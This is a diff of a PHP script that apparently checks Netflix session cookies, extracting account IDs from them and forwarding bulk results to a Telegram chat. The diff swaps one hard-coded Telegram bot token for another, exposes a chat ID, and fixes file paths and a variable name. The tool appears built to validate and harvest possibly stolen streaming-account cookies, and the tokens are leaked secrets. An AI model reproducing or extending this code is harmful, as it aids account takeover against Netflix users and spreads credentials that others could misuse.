@@ -14,7 +14,7 @@ if (isset($_GET['getSaved'])) {
 
     header('Content-Type: application/json');
 
-    $file = "saved_results.json";
+    $file = __DIR__ . "/saved_results.json";
 
     if (!file_exists($file)) {
         echo json_encode([]);
@@ -28,7 +28,7 @@ if (isset($_GET['getSaved'])) {
     exit;
 }
 
-putenv("TG_BOT_TOKEN=8151381339:AAHIxF0ERcB-u3fxcja99lObDozXjxoOKPk");
+putenv("TG_BOT_TOKEN=8151381339:AAH7nYMQx9fo7RHJsp1kqCrgVZN0-QxOMiQ");
 putenv("TG_CHAT_ID=6691379845");
 
 function extractNetflixId($cookie) {
@@ -121,14 +121,14 @@ $bulkResults = [];
 $raw = file_get_contents('php://input');
 $json_data = json_decode($raw, true);
 
-if (isset($data['bulk'])) {
+if (isset($json_data['bulk'])) {
 
-    if (!empty($data['bulk'])) {
-        $finalText = "📦 BULK RESULTS\n\n" . $data['bulk'];
+    if (!empty($json_data['bulk'])) {
+        $finalText = "📦 BULK RESULTS\n\n" . $json_data['bulk'];
         sendBulkFile($finalText);
     }
 
-    http_response_code(204); // silent
+    http_response_code(204);
     exit;
 }
 
@@ -204,7 +204,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         "time" => date("Y-m-d H:i:s")
     ];
 
-    $file = "saved_results.json";
+    $file = __DIR__ . "/saved_results.json";
 
     $existing = [];
     if (file_exists($file)) {
